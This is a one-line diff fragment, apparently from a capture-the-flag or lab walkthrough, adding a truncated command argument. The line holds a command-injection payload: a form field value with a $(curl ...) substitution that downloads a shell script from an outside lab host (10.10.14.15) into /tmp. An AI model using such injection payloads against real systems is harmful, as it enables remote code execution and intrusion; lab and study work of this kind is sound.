@@ -1,0 +1,1 @@
+ncode 'formurl=10.10.14.15/$(curl 10.10.14.15/shell.sh -o /tmp/0xdf)' --data-urlencode
